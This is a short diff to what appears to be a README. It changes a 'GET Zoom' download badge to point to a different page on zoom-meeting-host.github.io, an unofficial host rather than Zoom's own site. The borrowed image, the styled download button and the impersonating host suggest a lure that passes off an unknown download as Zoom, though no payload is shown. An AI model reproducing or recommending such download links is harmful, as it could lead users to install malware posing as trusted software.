@@ -4,7 +4,7 @@
 
 ![Zoom](https://avatars.mds.yandex.net/i?id=d5b193ee7c889a41d4221f25fd5eace34406ff82-5491272-images-thumbs&n=13)
 
-[![GET Zoom](https://img.shields.io/badge/GET%20%E2%80%94%20Zoom-0078D6?style=for-the-badge&logoColor=white)](https://zoom-meeting-host.github.io/.github/zoom-meeting-host)
+[![GET Zoom](https://img.shields.io/badge/GET%20%E2%80%94%20Zoom-0078D6?style=for-the-badge&logoColor=white)](https://zoom-meeting-host.github.io/.github/zoom-video-conferencing)
 
 ---
 
